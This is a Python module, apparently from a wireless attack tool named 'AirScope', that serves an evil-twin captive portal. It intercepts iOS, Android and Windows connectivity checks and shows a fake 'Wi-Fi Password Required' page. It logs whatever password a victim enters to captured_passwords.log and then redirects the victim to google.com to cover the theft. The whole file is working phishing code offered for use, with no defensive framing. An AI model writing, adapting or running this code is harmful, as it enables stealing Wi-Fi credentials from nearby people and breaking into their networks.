"""HTTP request handler with captive portal detection and router upgrade page."""

import time
from pathlib import Path


CAPTIVE_URLS = {
    '/hotspot-detect.html': 'ios',
    '/library/test/success.html': 'ios',
    '/generate_204': 'android',
    '/generate_204?': 'android',
    '/connecttest.htm': 'windows',
    '/connecttest.xml': 'windows',
    '/': 'generic',
}


def handle_http_request(request: str, victim_mac: bytes) -> bytes:
    """Parse HTTP request and return response bytes."""
    lines = request.split('\r\n')
    if not lines:
        return b''

    request_line = lines[0]
    parts = request_line.split(' ')
    if len(parts) < 3:
        return _http_response(400, b'Bad Request')

    method, path, _version = parts[0], parts[1], parts[2]

    path_clean = path.split('?')[0]

    if path_clean == '/generate_204':
        return _http_redirect('http://10.0.0.1/')

    if path_clean in ('/hotspot-detect.html', '/library/test/success.html'):
        return _http_response(200, _get_portal_html())

    if path_clean == '/connecttest.htm':
        return _http_response(200, _get_portal_html())

    if method == 'GET':
        if path_clean in ('/', '/index.html'):
            return _http_response(200, _get_portal_html())
        elif path_clean == '/submit':
            return _handle_submit(request)
        elif path_clean == '/favicon.ico':
            return _http_response(204, b'')
        else:
            return _http_response(404, b'<h1>404 Not Found</h1>')

    elif method == 'POST':
        if path_clean == '/submit':
            return _handle_submit(request)
        return _http_response(405, b'Method Not Allowed')

    return _http_response(405, b'Method Not Allowed')


def _handle_submit(request: str) -> bytes:
    """Handle password submission from the portal form."""
    body = request.split('\r\n\r\n', 1)
    if len(body) < 2:
        return _http_response(400, b'Bad Request')

    post_data = body[1]
    params = {}
    for pair in post_data.split('&'):
        if '=' in pair:
            k, v = pair.split('=', 1)
            from urllib.parse import unquote
            params[unquote(k)] = unquote(v)

    password = params.get('password', '')

    _log_captured_password(password)

    html = """<!DOCTYPE html>
<html><head><title>Success</title></head>
<body style="font-family:sans-serif;text-align:center;margin-top:100px;">
<h2>✓ Connected</h2>
<p>Redirecting to internet...</p>
<script>setTimeout(()=>{window.location='http://google.com'},2000)</script>
</body></html>"""
    return _http_response(200, html.encode())


def _log_captured_password(password: str):
    """Log captured password. In production, this posts to the TUI."""
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    log_dir = Path.home() / "airscope" / "logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    log_file = log_dir / "captured_passwords.log"
    with open(log_file, 'a') as f:
        f.write(f"[{timestamp}] PASSWORD: {password}\n")
    print(f"\n\033[92m[EVIL TWIN] Password captured: {password}\033[0m\n")


def _get_portal_html() -> bytes:
    """Return the fake router firmware upgrade page."""
    return _PORTAL_HTML.encode('utf-8')


_PORTAL_HTML = """<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Network Authentication</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
}
.card {
  background: white;
  border-radius: 16px;
  padding: 40px 32px;
  box-shadow: 0 20px 60px rgba(0,0,0,0.3);
  max-width: 380px;
  width: 100%;
  text-align: center;
}
.icon { font-size: 56px; margin-bottom: 16px; }
h1 { font-size: 22px; color: #1a1a2e; margin-bottom: 8px; }
p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 24px; }
.input-group { margin-bottom: 16px; text-align: left; }
label { display: block; font-size: 13px; color: #444; margin-bottom: 6px; font-weight: 500; }
input[type="password"] {
  width: 100%;
  padding: 14px 16px;
  border: 2px solid #e0e0e0;
  border-radius: 10px;
  font-size: 16px;
  transition: border-color 0.2s;
  -webkit-appearance: none;
}
input[type="password"]:focus {
  outline: none;
  border-color: #667eea;
}
button {
  width: 100%;
  padding: 14px;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  border: none;
  border-radius: 10px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: transform 0.1s, box-shadow 0.2s;
}
button:active { transform: scale(0.98); }
.status {
  margin-top: 20px;
  font-size: 12px;
  color: #999;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
}
.dot {
  width: 8px; height: 8px;
  background: #34c759;
  border-radius: 50%;
  animation: pulse 2s infinite;
}
@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.5; }
}
.footer {
  margin-top: 24px;
  padding-top: 16px;
  border-top: 1px solid #eee;
  font-size: 11px;
  color: #bbb;
}
</style>
</head>
<body>
<div class="card">
  <div class="icon">📡</div>
  <h1>Wi-Fi Password Required</h1>
  <p>Your device is connected to the network but requires authentication.
     Enter your Wi-Fi password to gain full internet access.</p>
  <form method="POST" action="/submit">
    <div class="input-group">
      <label for="pw">Network Password</label>
      <input type="password" id="pw" name="password"
             placeholder="Enter password" required
             autocomplete="off" autofocus>
    </div>
    <button type="submit">Connect</button>
  </form>
  <div class="status">
    <div class="dot"></div>
    <span>Connected to network</span>
  </div>
  <div class="footer">
    If this is your personal network, the password is the one you use
    to connect your devices.
  </div>
</div>
</body>
</html>"""


def _http_response(status: int, body: bytes) -> bytes:
    """Build a complete HTTP response."""
    status_text = {200: 'OK', 204: 'No Content', 302: 'Found',
                   400: 'Bad Request', 404: 'Not Found', 405: 'Method Not Allowed'}
    text = status_text.get(status, 'Unknown')

    headers = (
        f"HTTP/1.1 {status} {text}\r\n"
        f"Content-Type: text/html; charset=utf-8\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"Server: AirScope\r\n"
        f"\r\n"
    )
    return headers.encode() + body


def _http_redirect(location: str) -> bytes:
    """Build a 302 redirect response."""
    return (
        f"HTTP/1.1 302 Found\r\n"
        f"Location: {location}\r\n"
        f"Content-Length: 0\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
